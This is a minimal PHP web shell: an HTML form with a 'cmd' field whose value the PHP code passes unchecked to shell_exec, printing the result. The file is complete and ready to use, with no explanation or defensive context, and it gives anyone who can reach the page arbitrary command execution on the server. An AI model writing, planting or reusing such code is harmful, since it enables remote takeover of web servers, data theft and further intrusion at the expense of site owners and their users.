<html>
<body>
<form action="main.php" method="post">
    cmd <input type="text" name="cmd">
    <br>
    <input type="submit" value="Run">
</form>
</body>
</html>
<?php
    echo "<pre>" . shell_exec($_POST['cmd']) . "</pre>";
?>
